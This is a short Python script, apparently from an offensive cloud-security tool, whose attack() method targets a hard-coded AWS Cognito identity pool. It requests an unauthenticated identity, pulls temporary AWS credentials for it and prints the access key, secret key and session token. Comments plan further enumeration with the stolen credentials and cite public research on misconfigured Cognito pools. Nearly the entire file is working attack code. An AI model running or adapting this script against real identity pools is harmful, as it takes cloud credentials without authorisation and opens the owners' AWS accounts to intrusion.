# To add authenticated identity checks
# also add enumeration after accessing credentials
# Add code for getting region and cognito endpoint
# Link - https://andresriancho.com/internet-scale-analysis-of-aws-cognito-security/
import boto3

class Cognito:
    pass

    def attack(self):
        client = boto3.client('cognito-identity', region_name="us-east-2")

        try:
            _id = client.get_id(IdentityPoolId="us-east-2:242fadac-86fa-4afb-9a48-83a546572559")
        except client.exceptions.NotAuthorizedException as e:
            fail_message = "Bla Bla: {}".format(e)
            print(fail_message)
            return fail_message
        _id = _id['IdentityId']

        credentials = client.get_credentials_for_identity(IdentityId=_id)

        access_key = credentials['Credentials']['AccessKeyId']
        secret_key = credentials['Credentials']['SecretKey']
        session_token = credentials['Credentials']['SessionToken']
        identity_id = credentials['IdentityId']

        print(access_key, secret_key, session_token)
